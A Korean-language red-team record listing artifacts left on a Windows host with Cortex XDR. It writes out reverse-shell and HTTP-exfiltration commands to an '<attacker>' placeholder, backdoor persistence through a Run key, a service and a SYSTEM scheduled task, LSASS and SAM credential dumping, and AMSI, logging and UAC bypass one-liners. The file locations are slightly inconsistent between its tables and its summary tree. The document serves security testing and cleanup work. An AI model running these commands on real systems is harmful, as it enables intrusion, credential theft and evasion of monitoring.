# Windows 서버 — 설치된 공격 도구 및 파일 목록

> **대상 서버**: Windows 10/11  
> **Cortex XDR 에이전트 설치됨**  
> 레드팀 테스트 중 해당 서버에 직접 설치/생성/수정된 항목만 기록

---

## 📦 드롭된 실행 파일

| 경로 | 파일명 | 설명 | 투하 방법 |
|------|--------|------|---------|
| `C:\Windows\Temp\` | `nc.exe` | Netcat 리버스쉘 | certutil 다운로드 |
| `C:\Windows\Temp\` | `mimikatz.exe` | 자격증명 덤프 도구 | certutil 다운로드 |
| `C:\Windows\Temp\` | `Invoke-Mimikatz.ps1` | PowerShell 버전 mimikatz | IEX DownloadString |
| `C:\Windows\Temp\` | `procdump.exe` | LSASS 메모리 덤프 | certutil 다운로드 |
| `C:\Windows\Temp\` | `PrintSpoofer.exe` | SYSTEM 권한 상승 | certutil 다운로드 |
| `C:\Windows\Temp\` | `SharpDPAPI.exe` | DPAPI 자격증명 추출 | certutil 다운로드 |
| `C:\Temp\` | `loot.zip` | 수집 파일 아카이브 | robocopy 후 압축 |
| `C:\Temp\` | `lsass.dmp` | LSASS 메모리 덤프 파일 | procdump 실행 결과 |
| `C:\Temp\` | `sam.hive` | SAM 레지스트리 하이브 | reg save |
| `C:\Temp\` | `shell.exe` | 지속성용 리버스쉘 바이너리 | certutil 다운로드 |

---

## 🔑 레지스트리 수정 항목

| 키 경로 | 값 이름 | 값 데이터 | 목적 |
|--------|---------|----------|------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `backdoor` | `C:\Windows\Temp\nc.exe <ip> 4444 -e cmd` | 지속성 |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` | `EnableScriptBlockLogging` | `0` | 로깅 비활성화 |

---

## ⚙️ 등록된 서비스

| 서비스명 | BinPath | 설명 |
|---------|---------|------|
| `BackdoorSvc` | `C:\Windows\Temp\shell.exe` | 지속성용 백도어 서비스 |

```cmd
sc create BackdoorSvc binpath="C:\Windows\Temp\shell.exe" start=auto
sc start BackdoorSvc
```

---

## 📅 등록된 스케줄 작업

| 작업명 | 실행 파일 | 주기 |
|--------|---------|------|
| `Updater` | `C:\Temp\shell.exe` | 매 5분 |

```cmd
schtasks /create /tn "Updater" /tr "C:\Temp\shell.exe" /sc minute /mo 5 /ru SYSTEM
```

---

## 🌐 네트워크 연결 (생성된 세션)

| 유형 | 명령어 | 포트 |
|------|--------|------|
| PowerShell 리버스쉘 | `$client = New-Object TCPClient('<attacker>',4444)` | 4444 |
| nc.exe 리버스쉘 | `C:\Windows\Temp\nc.exe <attacker> 5555 -e cmd.exe` | 5555 |
| HTTP 파일 유출 | `Invoke-RestMethod -Uri http://<attacker>/upload -Method POST` | 80 |

---

## 📝 수집된 자격증명 (덤프)

| 출처 | 내용 | 도구 |
|------|------|------|
| LSASS 메모리 | NTLM 해시, 평문 패스워드 | mimikatz `sekurlsa::logonpasswords` |
| SAM 하이브 | 로컬 계정 NTLM 해시 | `reg save HKLM\SAM` + impacket secretsdump |
| 브라우저 저장 패스워드 | DPAPI 복호화된 크레덴셜 | SharpDPAPI |
| 하드코딩 크레덴셜 | config 파일 내 평문 패스워드 | `findstr /si "password" *.xml *.config` |

---

## 🛡️ 우회된 보안 기능

| 기능 | 우회 방법 | 명령어 |
|------|---------|--------|
| AMSI | 메모리 패치 | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` |
| Script Block Logging | 레지스트리 비활성화 | `Set-ItemProperty EnableScriptBlockLogging -Value 0` |
| PowerShell 버전 다운그레이드 | v2 실행 (AMSI 없음) | `powershell -version 2` |
| UAC | fodhelper.exe 하이재킹 | 레지스트리 HKCU\shell\open\command 조작 |

---

## 🧹 아티팩트 요약

```
C:\Windows\Temp\
├── nc.exe               ← Netcat
├── mimikatz.exe         ← 자격증명 덤프
├── Invoke-Mimikatz.ps1  ← PS 버전 mimikatz
├── procdump.exe         ← LSASS 덤프용
├── PrintSpoofer.exe     ← 권한상승
└── shell.exe            ← 지속성 백도어

C:\Temp\
├── lsass.dmp            ← LSASS 메모리 덤프
├── sam.hive             ← SAM 레지스트리
├── SharpDPAPI.exe       ← DPAPI 크레덴셜 추출
└── loot.zip             ← 수집 파일

레지스트리:
  HKCU\...\Run\backdoor  ← 자동 시작 항목

서비스:
  BackdoorSvc            ← 백도어 서비스

스케줄 작업:
  \Updater               ← 5분 주기 실행
```
